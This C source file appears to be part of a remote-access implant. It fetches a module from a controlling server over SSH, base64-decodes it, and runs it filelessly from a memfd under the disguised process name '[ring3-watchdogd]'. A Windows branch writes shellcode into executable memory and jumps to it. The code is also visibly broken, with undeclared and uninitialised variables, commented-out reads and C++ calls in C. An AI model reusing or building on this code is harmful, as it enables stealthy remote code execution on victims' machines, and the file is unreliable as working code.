// Agent in-memory execution definitions
#include "common.h"
#include <libssh/libssh.h>
#ifdef _WIN32
#define strncasecmp _strnicmp
int exec_module(ssh_session session, char *module){
	ULONG32 payload_size;
    char * alloc_mem_ptr;
    int i;
    void (*func_ptr)();
    
    // Tests connection
    //int sock_count = recv(remote_sock, (char *)&payload_size, 4, 0);
    
    //if (sock_count != 4 || payload_size <= 0) 
      //  cleanup_sockets(remote_sock);
    
    alloc_mem_ptr = VirtualAlloc(0, payload_size + 5, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

    if (alloc_mem_ptr == NULL) 
        return -1;
        
    alloc_mem_ptr[0] = 0xBF;
    // writes first 4 bytes of socket information into second position of alloc_mem_ptr
    memcpy(alloc_mem_ptr + 1, &remote_sock, 4);

	int rc=0;
    int count=0;
    void * startb = alloc_mem_ptr + 5;
    while (count < payload_size) {
        //rc = recv(sock, (char *)startb, size_of - count, 0);
        startb += rc; 
        count += rc;
        if (rc == SOCKET_ERROR) 
            return -1;
    }

    func_ptr = (void (*)())alloc_mem_ptr;
    func_ptr();
}
#include <winsock.h>
#else
#define _GNU_SOURCE
#include <sys/mman.h>
#include <fcntl.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <stdio.h>
#include <sys/wait.h>
#include <sys/types.h>

int do_exec(char *buff, int size){
	/* Helper function for executing a buffer in RAM
	 * Returns the process exit code or -1 on error
	 */
	pid_t child;
	int p_id;
	int status = 0;
	int fd;
    char *p;
 
    p_id=getpid();  /*process id*/
     
    printf("Current process ID: %d\n",p_id);
    
// Create anon FD
    fd = memfd_create("", 1U); // MFD_CLOEXEC
    write(fd, buff, size);
    asprintf(&p, "/proc/%d/fd/%i", p_id, fd);
    
// fork to background
	child = fork();
    if (child == 0)
    {

		// So here might be a problem

		// A call to this function from a process with more than one 
		// thread results in all threads being terminated and the new 
		// executable image being loaded and executed. No destructor 
		// functions are called. 

		// The good news is that it might only apply to the calling
		// process, and so if we call it from a thread there wont be 
		// any closed threads?
        execlp(p, "[ring3-watchdogd]", NULL);
        perror("execution error");
        exit(-1);
	}
	
    else if (child == -1)
    {
        perror("fork");
        exit(-1);
    }

// Wait and exit
	waitpid(child, &status, 0);
	if ( WIFEXITED(status) ) 
    { 
        int exit_status = WEXITSTATUS(status);         
		printf("Exit status of the child was %d\n", exit_status); 
		return exit_status;
    } 
	return -1;
}

int exec_module(ssh_channel channel, char *module){
	int rc = 0;
	int nbytes = 0;
	int exit_status = 0;
	int size = 0;
	int finSize = 0;
	char *buff;
	char *ptrFin;
	char buffr[BUFSIZ];
	
	memset(buffr, 0, sizeof(buffr));
	sprintf(buffr, "14|%s", module);
	
	printf("Downloading module...\n");
	
	// write module name to server
	rc = ssh_channel_write(channel, buffr, strlen(buffr));
	if (rc == SSH_ERROR)
  	{
		printf("Write to channel failed\n");
    	ssh_channel_close(channel);
    	ssh_channel_free(channel);
    	return rc;
	}
	
	// get encoded size of file
	memset(buffr, 0, sizeof(buffr));
	nbytes = ssh_channel_read(channel, buffr, sizeof(buffr), 0);
	if (nbytes < 0){
		printf("Caught read error from server...\n");
    	ssh_channel_close(channel);
    	ssh_channel_free(channel);
    	return SSH_ERROR;
	}	

	rc = ssh_channel_write(channel, "ok", 3);
	if (rc == SSH_ERROR){
		printf("Caught ssh error: %s\n", ssh_get_error(channel));
		ssh_channel_close(channel);
    	ssh_channel_free(channel);
    	return rc;
	}

	// convert size to integer and allocate memory
	size = atoi(buffr);
	printf("%s, %d\n", buffr, size);

	buff = (char*)malloc(size+1);
	memset(buff, 0, size+1);

	// read file from channel and decode
	rc = ssh_channel_read(channel, buff, size, 0);
	
	finSize = B64::dec_size(buff);
	ptrFin = (char*)malloc(finSize+1);
	memset(ptrFin, 0, finSize+1);

	
	if(!B64::decode(buff, (unsigned char *)ptrFin, finSize)){
		printf("Decode failure\n");
		return SSH_ERROR;
	}

	free(buff);

	// execute file from memory
	exit_status = do_exec(ptrFin, size);
	memset(buffr, 0, sizeof(buffr));
	sprintf(buffr, "%d", exit_status);

	ssh_channel_write(channel, buffr, 2);
	//free(ptrFin);
	return 0;
}
#endif


